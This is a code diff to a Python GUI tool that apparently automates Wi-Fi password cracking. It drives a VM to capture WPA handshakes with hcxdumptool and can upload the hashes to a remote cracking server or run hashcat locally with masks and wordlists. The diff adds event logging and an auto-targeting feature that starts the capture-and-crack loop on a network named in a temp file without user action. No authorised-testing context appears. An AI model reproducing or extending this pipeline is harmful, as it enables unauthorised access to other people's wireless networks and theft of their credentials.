@@ -376,10 +376,23 @@ class App:
             pass
         self.root.after(40, self._drain)
 
+    def _ev(self, tag, msg=''):
+        try:
+            p = '/tmp/mac_wifi_events.log'
+            try:
+                if os.path.getsize(p) > 400 * 1024:
+                    os.replace(p, p + '.1')
+            except Exception:
+                pass
+            with open(p, 'a') as f:
+                f.write('%s [%s] %s\n' % (
+                    time.strftime('%m-%d %H:%M:%S'), tag, msg))
+        except Exception:
+            pass
+
     def _log(self, msg):
         try:
-            with open('/tmp/mac_wifi_events.log', 'a') as f:
-                f.write(time.strftime('%H:%M:%S ') + msg + '\n')
+            self._ev('gui', msg)
         except Exception:
             pass
         def _do():
@@ -478,8 +491,11 @@ class App:
                  'nc -U -w 3 ' + MON_SOCK],
                 capture_output=True, timeout=20)
             time.sleep(4)
-            return self.wlan_ok()
-        except Exception:
+            ok = self.wlan_ok()
+            self._ev('hotadd', 'wlan_ok=%s' % ok)
+            return ok
+        except Exception as e:
+            self._ev('hotadd', 'err=%r' % e)
             return False
 
     def _startup_vm(self):
@@ -579,12 +595,14 @@ class App:
                 if miss >= 3:
                     miss = 0
                     self._log('虛擬機失聯 → 自動重啟')
+                    self._ev('heal', 'trigger=vm_lost x3')
                     self.boot_vm_if_needed()
                 time.sleep(5)
                 continue
             miss = 0
             if not self.wlan_ok():
                 self._log('網卡不在虛擬機 → 嘗試熱掛接...')
+                self._ev('heal', 'trigger=wlan_missing')
                 if not self.hotadd_adapter():
                     self._ui(lambda: self._set_text(
                         self.lbl_scan, '⚠️ 請拔插 USB 網卡', C_AMBER))
@@ -597,6 +615,7 @@ class App:
                 if zero >= 3:
                     self._zero_scans = 0
                     self._log('連續掃不到訊號 → 重建抓包環境')
+                    self._ev('heal', 'trigger=zero_scans x3')
                     try:
                         subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
                     except Exception:
@@ -641,6 +660,21 @@ class App:
                 for a in aps[:20]:
                     f.write('  ' + str(a[0]) + ' ' + str(a[1]) + ' ch' + str(a[2]) + ' ' + str(a[3]) + '\n')
             self.aps = aps
+            if not self.target and not self._running.is_set():
+                try:
+                    at = open('/tmp/mac_wifi_autotarget').read().strip()
+                except Exception:
+                    at = ''
+                if at:
+                    for t in aps:
+                        if t[1] == at or t[0] == at:
+                            self.target = (t[0], t[1], t[2])
+                            self._log('🎯 自動選定(測試): %s' % t[0])
+                            threading.Thread(
+                                target=self._auto_loop,
+                                args=(t[0], t[1], t[2]),
+                                daemon=True).start()
+                            break
             self._refresh_tree()
             self._ui(lambda: self.lbl_scan.config(
                 text='📡 %s · %d AP' % (time.strftime('%H:%M:%S'), len(aps)),
@@ -855,6 +889,7 @@ class App:
         self.set_phase('cap', '第 %d 輪抓包 (%ds)' % (rnd, dur),
                        'hcxdumptool %s ch%s' % (bssid, ch))
         script = (BIND +
+CH + 'rm -f /tmp/scan_* 2>/dev/null\n' +
 CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                   CH + 'ifconfig wlan0 up 2>/dev/null\nsleep 3\n' +
@@ -867,10 +902,13 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   'echo "===HASH==="\n' +
                   'cat ' + CH + '/tmp/scan_%d.22000 2>/dev/null\n' % rnd +
                   'echo "===END==="\n')
+        t0 = time.time()
         r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
                            capture_output=True, timeout=dur + 150)
         out = (r.stdout or b'').decode('utf-8', 'replace') + \
               (r.stderr or b'').decode('utf-8', 'replace')
+        self._ev('cap', 'round=%d rc=%s dur=%.1fs out=%dB' % (
+            rnd, r.returncode, time.time() - t0, len(out)))
         lines = out.splitlines()
         cap_part = []
         for line in lines:
@@ -897,6 +935,8 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             for l in cap_part[-4:]:
                 if l.strip():
                     self._log('   抓包器: %s' % l.strip()[:110])
+            self._ev('capfail', 'round=%d capout=%r' % (
+                rnd, ' | '.join(cap_part)[:400]))
             time.sleep(3)
             return
         # ---- 3. post (Windows 決定: 秒回 / 自動解 / 掛起待確認) ----
@@ -1021,9 +1061,15 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             cmd = [hc, '-m', '22000', '-w', '3',
                    '--potfile-path', pot, '--outfile-format', '2', hf]
             cmd += ['-a', '3', mask] if mask else [wl]
+            t0 = time.time()
             try:
-                subprocess.run(cmd, capture_output=True, timeout=900)
+                rc = subprocess.run(cmd, capture_output=True,
+                                    timeout=900).returncode
+                self._ev('localcrack', 'stage=%s rc=%s dur=%.1fs' % (
+                    desc, rc, time.time() - t0))
             except subprocess.TimeoutExpired:
+                self._ev('localcrack', 'stage=%s TIMEOUT dur=%.1fs' % (
+                    desc, time.time() - t0))
                 self._log('   階段逾時，跳過')
             pw = self._read_pot_pw(pot)
             if pw:
@@ -1038,13 +1084,17 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             s.connect(('192.168.1.1', 1))
             ip = s.getsockname()[0]
             s.close()
-            return ip.startswith('192.168.1.')
-        except Exception:
+            home = ip.startswith('192.168.1.')
+            self._ev('lan', 'src=%s home=%s' % (ip, home))
+            return home
+        except Exception as e:
+            self._ev('lan', 'err=%r home=False' % e)
             return False
 
     def _post(self, hashes, ssid, bssid, wip, port):
         payload = json.dumps({'hash': '\n'.join(hashes), 'ssid': ssid,
                               'bssid': bssid.lower()}).encode()
+        t0 = time.time()
         try:
             req = urllib.request.Request(
                 'http://%s:%s/api/receive-hash' % (wip, port),
@@ -1053,6 +1103,8 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             body = urllib.request.urlopen(req, timeout=20).read().decode(
                 'utf-8', 'replace')
             self._log('   上傳成功: %s' % body[:140])
+            self._ev('post', 'lines=%d dur=%.1fs body=%r' % (
+                len(hashes), time.time() - t0, body[:200]))
             try:
                 d = json.loads(body)
             except Exception:
@@ -1065,6 +1117,7 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             return 'auto', None
         except Exception as e:
             self._log('   上傳失敗: %s' % e)
+            self._ev('postfail', 'dur=%.1fs err=%r' % (time.time() - t0, e))
             return False, None
 
     def _wait_result(self, wip, port, timeout=900):
